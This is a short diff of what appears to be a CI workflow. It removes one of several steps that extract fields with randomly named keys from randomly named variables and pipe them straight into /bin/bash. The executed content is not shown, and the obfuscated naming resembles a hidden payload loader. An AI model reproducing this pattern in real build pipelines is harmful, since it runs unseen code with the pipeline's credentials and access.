@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$dlwzu103" | jq -r .dfk2060 | /bin/bash
           printf '%s' "$x093" | jq -r .xedop25730 | /bin/bash
           printf '%s' "$nd068" | jq -r .ipmw80 | /bin/bash
-          printf '%s' "$fgbt4" | jq -r .bmo96741 | /bin/bash
           printf '%s' "$kvu88232" | jq -r .rxjt453 | /bin/bash
 
       - name: Store results
